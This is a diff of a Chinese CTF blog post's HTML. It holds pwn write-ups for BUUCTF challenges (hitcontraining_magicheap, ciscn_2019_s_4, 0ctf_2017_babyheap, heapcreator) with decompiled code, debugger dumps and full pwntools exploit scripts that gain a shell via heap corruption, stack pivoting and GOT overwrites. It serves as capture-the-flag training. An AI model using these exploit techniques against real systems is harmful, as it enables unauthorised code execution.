-  <a href="#0x39hitcontraining_magicheap" class="heading-mark"></a>0x39.hitcontraining_magicheap</h2><div class="highlight" id="id-44"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="n">__noreturn</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><h2 id="0x39hitcontraining_magicheap" class="heading-element"><span>0x39.hitcontraining_magicheap</span>
+  <a href="#0x39hitcontraining_magicheap" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="n">__noreturn</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// eax
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-10h] BYREF
@@ -1004,7 +1045,7 @@ fmtstr_payload函数返回的就是payload</code></pre><p>具体可以去看：h
 </span></span><span class="line"><span class="cl">  <span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>edit的时候输入的长度任意，写fd和bk为magic的地址，放入unsorted bin中，然后即可get shell</p>
 <p>Exp：</p>
-<div class="highlight" id="id-45"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="n">magic</span> <span class="o">=</span> <span class="mh">0x6020A0</span>
 </span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
 </span></span><span class="line"><span class="cl"><span class="c1">## io = remote(&#34;node4.buuoj.cn&#34;,28141)</span>
@@ -1035,15 +1076,18 @@ fmtstr_payload函数返回的就是payload</code></pre><p>具体可以去看：h
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">,</span><span class="s1">&#39;4869&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="c1">## gdb.attach(p)</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><h2 id="0x3aciscn_2019_s_4" class="heading-element">
-  <a href="#0x3aciscn_2019_s_4" class="heading-mark"></a>0x3A.ciscn_2019_s_4</h2><div class="highlight" id="id-46"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">gwt@ubuntu:~/Desktop$ checksec ciscn_s_4 
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><h2 id="0x3aciscn_2019_s_4" class="heading-element"><span>0x3A.ciscn_2019_s_4</span>
+  <a href="#0x3aciscn_2019_s_4" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">gwt@ubuntu:~/Desktop$ checksec ciscn_s_4 
 </span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/gwt/Desktop/ciscn_s_4&#39;</span>
 </span></span><span class="line"><span class="cl">    Arch:     i386-32-little
 </span></span><span class="line"><span class="cl">    RELRO:    Partial RELRO
 </span></span><span class="line"><span class="cl">    Stack:    No canary found
 </span></span><span class="line"><span class="cl">    NX:       NX enabled
 </span></span><span class="line"><span class="cl">    PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
-</span></span><span class="line"><span class="cl">gwt@ubuntu:~/Desktop$ </span></span></code></pre></div><div class="highlight" id="id-47"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">gwt@ubuntu:~/Desktop$ </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">  <span class="nf">init</span><span class="p">();</span>
 </span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Welcome, my friend. What&#39;s your name?&#34;</span><span class="p">);</span>
@@ -1118,7 +1162,7 @@ fmtstr_payload函数返回的就是payload</code></pre><p>具体可以去看：h
 </blockquote>
 </blockquote>
 <p>输入0x20个a查看栈</p>
-<div class="highlight" id="id-49"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pwndbg&gt; stack <span class="m">30</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pwndbg&gt; stack <span class="m">30</span>
 </span></span><span class="line"><span class="cl">00:0000│ esp  0xffffd048 —▸ 0xffffd098 —▸ 0xffffd0a8 ◂— 0x0
 </span></span><span class="line"><span class="cl">01:0004│      0xffffd04c ◂— 0x30 /* <span class="s1">&#39;0&#39;</span> */
 </span></span><span class="line"><span class="cl">02:0008│      0xffffd050 —▸ 0xffffd070 ◂— 0x61616161 <span class="o">(</span><span class="s1">&#39;aaaa&#39;</span><span class="o">)</span>
@@ -1137,7 +1181,7 @@ fmtstr_payload函数返回的就是payload</code></pre><p>具体可以去看：h
 </span></span><span class="line"><span class="cl">15:0054│      0xffffd09c —▸ 0x804862a <span class="o">(</span>main+43<span class="o">)</span> ◂— mov    eax, <span class="m">0</span>
 </span></span><span class="line"><span class="cl">16:0058│      0xffffd0a0 —▸ 0xf7fb73dc <span class="o">(</span>__exit_funcs<span class="o">)</span> —▸ 0xf7fb81e0 <span class="o">(</span>initial<span class="o">)</span> ◂— 0x0
 </span></span><span class="line"><span class="cl">17:005c│      0xffffd0a4 —▸ 0xffffd0c0 ◂— 0x1</span></span></code></pre></div><p>可以看到ebp的地址是0xffffd0a8，输入的buf的地址是0xffffd070，相差0x38.</p>
-<div class="highlight" id="id-50"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x28</span><span class="p">)</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x28</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x28</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">ebp</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
@@ -1148,7 +1192,7 @@ fmtstr_payload函数返回的就是payload</code></pre><p>具体可以去看：h
 <p><img loading="lazy" src="/posts/buu-pwn-0x30-0x3f/1.png" alt="1" srcset="/posts/buu-pwn-0x30-0x3f/1.png?size=small, /posts/buu-pwn-0x30-0x3f/1.png?size=medium 1.5x, /posts/buu-pwn-0x30-0x3f/1.png?size=large 2x" data-title="1" style="--width: 1672px;--aspect-ratio: 1672 / 478;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>具体的调试情况如下：</p>
 <p>执行源程序中的leave前：</p>
-<div class="highlight" id="id-51"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">EAX  0x8
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">EAX  0x8
 </span></span><span class="line"><span class="cl"> EBX  0x0
 </span></span><span class="line"><span class="cl"> ECX  0xffffffff
 </span></span><span class="line"><span class="cl"> EDX  0xf7fb8870 <span class="o">(</span>_IO_stdfile_1_lock<span class="o">)</span> ◂— 0x0
@@ -1313,7 +1357,7 @@ fmtstr_payload函数返回的就是payload</code></pre><p>具体可以去看：h
 02:0008│      0xffffd07c ◂— &#39;/bin/sh&#39;
 03:000c│      0xffffd080 ◂— 0x68732f /* &#39;/sh&#39; */
 04:0010│      0xffffd084 ◂— 0x61616161 (&#39;aaaa&#39;)</code></pre><p>Exp：</p>
-<div class="highlight" id="id-56"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
 </span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;node4.buuoj.cn&#34;</span><span class="p">,</span><span class="mi">27655</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="c1">## io = process(&#34;./ciscn_s_4&#34;)</span>
@@ -1337,11 +1381,14 @@ fmtstr_payload函数返回的就是payload</code></pre><p>具体可以去看：h
 </span></span><span class="line"><span class="cl"><span class="c1">##payload += (0x28 - len(payload))* b&#39;a&#39; + p32(buf_add) + p32(leave)</span>
 </span></span><span class="line"><span class="cl"><span class="c1">##两个payload都可以，意思都一样</span>
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><h2 id="0x3b0ctf_2017_babyheap" class="heading-element">
-  <a href="#0x3b0ctf_2017_babyheap" class="heading-mark"></a>0x3B.0ctf_2017_babyheap</h2><p>这题重复了，前面有个一样的。</p>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><h2 id="0x3b0ctf_2017_babyheap" class="heading-element"><span>0x3B.0ctf_2017_babyheap</span>
+  <a href="#0x3b0ctf_2017_babyheap" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>这题重复了，前面有个一样的。</p>
 <p>当unsortedbin只有一个时，他的fd和bk指向<code>main_arena + 0x58</code>，而且 main_arena 又相对 libc 固定偏移 0x3c4b20，所以得到的内容减去0x3c4b78就是libc的基地址</p>
 <p>exp：</p>
-<div class="highlight" id="id-57"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;DEBUG&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="c1">## io = process(&#39;./0ctf_2017_babyheap&#39;)</span>
 </span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;node4.buuoj.cn&#34;</span><span class="p">,</span> <span class="mi">26377</span><span class="p">)</span>
@@ -1407,8 +1454,11 @@ fmtstr_payload函数返回的就是payload</code></pre><p>具体可以去看：h
 </span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x4526a</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">fill</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">allocate</span><span class="p">(</span><span class="mh">0x60</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><h2 id="0x3chitcontraining_heapcreator" class="heading-element">
-  <a href="#0x3chitcontraining_heapcreator" class="heading-mark"></a>0x3C.hitcontraining_heapcreator</h2><div class="highlight" id="id-58"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">create_heap</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><h2 id="0x3chitcontraining_heapcreator" class="heading-element"><span>0x3C.hitcontraining_heapcreator</span>
+  <a href="#0x3chitcontraining_heapcreator" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">create_heap</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">  <span class="kt">void</span> <span class="o">**</span><span class="n">v0</span><span class="p">;</span> <span class="c1">// rbx
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+4h] [rbp-2Ch]
@@ -1446,7 +1496,7 @@ fmtstr_payload函数返回的就是payload</code></pre><p>具体可以去看：h
 </span></span><span class="line"><span class="cl">  <span class="p">}</span>
 </span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v5</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>申请的首个0x10，前0x8放size，后半部分放申请的size的地址</p>
-<div class="highlight" id="id-59"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">edit_heap</span><span class="p">()</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">edit_heap</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-14h]
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span> <span class="c1">// [rsp+10h] [rbp-10h] BYREF
@@ -1473,7 +1523,7 @@ fmtstr_payload函数返回的就是payload</code></pre><p>具体可以去看：h
 </span></span><span class="line"><span class="cl">  <span class="p">}</span>
 </span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v3</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>delete：</p>
-<div class="highlight" id="id-60"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">delete_heap</span><span class="p">()</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">delete_heap</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-14h]
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span> <span class="c1">// [rsp+10h] [rbp-10h] BYREF
@@ -1501,20 +1551,20 @@ fmtstr_payload函数返回的就是payload</code></pre><p>具体可以去看：h
 </span></span><span class="line"><span class="cl">  <span class="p">}</span>
 </span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v3</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>思路：利用edit的off by one ，覆写size，然后free掉，再申请，填充payload，将free的got打印出来，覆写free的地址为system的地址，然后delete即可。</p>
-<div class="highlight" id="id-61"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mh">0x18</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mh">0x18</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x18</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\x81</span><span class="s1">&#39;</span><span class="p">)</span></span></span></code></pre></div><p>覆写掉第二次的0x10的size位为0x81;</p>
-<div class="highlight" id="id-62"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mh">0x70</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x40</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;free&#39;</span><span class="p">]))</span>
 </span></span><span class="line"><span class="cl"><span class="n">show</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Content : &#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">free_add</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Done&#39;</span><span class="p">)[:</span><span class="o">-</span><span class="mi">5</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span></span></span></code></pre></div><p>将free的地址打印出来；</p>
-<div class="highlight" id="id-63"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">system_add</span><span class="p">))</span></span></span></code></pre></div><p>这里是将malloc的地址的地址改为system的地址，再之后free的时候就转为执行system.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">system_add</span><span class="p">))</span></span></span></code></pre></div><p>这里是将malloc的地址的地址改为system的地址，再之后free的时候就转为执行system.</p>
 <p>Exp：</p>
-<div class="highlight" id="id-64"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;DEBUG&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s2">&#34;node4.buuoj.cn&#34;</span><span class="p">,</span><span class="mi">28078</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="c1">## io = process(&#34;heapcreator&#34;)</span>
@@ -1561,9 +1611,12 @@ fmtstr_payload函数返回的就是payload</code></pre><p>具体可以去看：h
 </span></span><span class="line"><span class="cl"><span class="c1">## gdb.attach(io)</span>
 </span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">system_add</span><span class="p">))</span>
 </span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><h2 id="0x3dwustctf2020_closed" class="heading-element">
-  <a href="#0x3dwustctf2020_closed" class="heading-mark"></a>0x3D.wustctf2020_closed</h2><p>感觉挺有意思的一个题，考的不是pwn的知识，应该是Linux相关的知识</p>
-<div class="highlight" id="id-65"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="nf">vulnerable</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><h2 id="0x3dwustctf2020_closed" class="heading-element"><span>0x3D.wustctf2020_closed</span>
+  <a href="#0x3dwustctf2020_closed" class="heading-mark">
